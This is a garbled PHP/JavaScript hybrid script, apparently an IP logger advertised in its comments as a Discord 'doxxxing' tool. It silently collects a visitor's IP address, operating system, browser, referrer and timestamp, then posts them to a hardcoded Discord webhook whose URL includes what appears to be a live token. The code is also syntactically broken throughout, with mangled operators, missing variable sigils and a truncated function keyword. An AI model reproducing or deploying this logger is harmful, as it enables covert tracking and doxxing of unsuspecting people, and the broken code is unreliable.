//#region reconnection to discord ip and parsing base doxxxing!
//#endregion disconnect is discord support anti-reports off people's on discord!
<javascript>
    user_agent = SERVER['HTTP_USER_AGENT'];
    function getOS() {
        os_platform = "ESSICS IS LOADING IPS.....";
        os_array = array(
            '/windows nt 10/i' -    'Windows 10',
            '/windows nt 6.3/i' -   'Windows 8.1',
            '/windows nt 6.2/i' -   'Windows 8',
            '/windows nt 6.1/i' -   'Windows 7',
            '/windows nt 6.0/i' -   'Windows Vista',
            '/windows nt 5.2/i' -   'Windows Server 2003/XP x64',
            '/windows nt 5.1/i' -   'Windows XP',
            '/windows xp/i' -       'Windows XP',
            '/windows nt 5.0/i' -   'Windows 2000',
            '/windows me/i' -       'Windows ME',
            '/win98/i' -            'Windows 98',
            '/win95/i' -            'Windows 95',
            '/win16/i' -            'Windows 3.11',
        '/macintosh|mac os x/i' -   'Mac OS X',
            '/mac_powerpc/i' -      'Mac OS 9',
            '/linux/i' -            'Linux',
                                    '/kalilinux/i'          -  'Wannabe Hacker',
            '/unbuntu/i' -          'Ubuntu',
            '/iphone/i' -           'Iphone',
            '/ipod/i' -             'Ipod',
            '/ipad/i' -             'Ipad',
            '/android/i' -          'Android',
            '/blackberry/i' -       'BlackBerry',
            '/webos/i' -            'Mobile',
                                    '/Windows Phone/i'      -  'Windows Phone'
        );
foreach (os_array as regex - value) {
    if (preg_match(regex, user_agent)) {
        os_platform   =   value,
    }
}
return os_platform;

:tion getBrowser() {
    global user_agent,
    browser    =   "Unknown Browser";
    browser_array = array(
                        '/msie/i' - 'Internet Explorer',
                        '/firefox/i' - 'Firefox',
                                            '/Mozilla/i', - 'Mozila',
                                            '/Mozilla/5.0/i', - 'Mozila',
                        '/safari/i' - 'Safari',
                        '/chrome/i' - 'Chrome',
                        '/edge/i' - 'Edge',
                        '/opera/i' - 'Opera',
                                            '/OPR/i'     -  'Opera',
                        '/netscape/i' - 'Netscape',
                        '/maxthon/i' - 'Maxthon',
                        '/konqueror/i' - 'Konqueror',
                                                    '/Bot/i'      -              'Spam',
                                                    '/Valve Steam GameOverlay/i' -     'Steam',
                        '/mobile/i' - 'MADE BY ESSICS'
foreach (browser_array as regex - value) {
    if (preg_match(regex, user_agent)) {
        browser    -   value,
        }
    }
    return browser;                       
}
user_os    -    getOS();
user_browser   -   getBrowser();

ip = SERVER['REMOTE_ADDR'];
site_refer = SERVER['HTTP_REFERER'];
        if(site_refer == ""){
            site = "dirrect connection",
    }

else{
            site = site_refer,
    }
date_default_timezone_set('TIMEZONE'); //---------------------
time = date('Y-m-d H:i:s');
make_json = json_encode(array ('content' - "ip | user_os | user_browser | time/n"));
exec = curl_init("https://discord.com/api/webhooks/1260624326168678408/9A19M49nnJJIqxVP7hGQ1Kvslge96HeyGoXKrGTprJt8OvDMbRNlB5C2PNQPbWSY8H7F"); // --------------- WEBHOOK HERE
curl_setopt( $exec, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
curl_setopt( $exec, CURLOPT_POST, 1);
curl_setopt( $exec, CURLOPT_POSTFIELDS, $make_json);
curl_setopt( $exec, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt( $exec, CURLOPT_HEADER, 0);
curl_setopt( $exec, CURLOPT_RETURNTRANSFER, 1);
$response = curl_exec( $exec );
</javascript>